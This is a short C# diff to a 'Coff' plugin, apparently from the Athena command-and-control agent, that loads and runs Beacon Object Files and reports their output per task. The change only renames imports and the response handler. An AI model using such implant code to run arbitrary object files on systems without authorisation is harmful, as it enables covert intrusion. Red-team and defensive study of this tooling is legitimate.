@@ -1,8 +1,10 @@
-﻿using Athena.Plugins;
+﻿using Athena.Commands.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using coff.coff;
+using Athena.Commands;
+
 namespace Plugins
 {
     public class Coff : AthenaPlugin
@@ -20,11 +22,11 @@ namespace Plugins
                 BofRunner br = new BofRunner(args);
                 br.LoadBof();
                 BofRunnerOutput bro = br.RunBof(60);
-                PluginHandler.Write(bro.Output, args["task-id"], true);
+                TaskResponseHandler.Write(bro.Output, args["task-id"], true);
             }
             catch (Exception e)
             {
-                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
+                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
             }
         }
     }
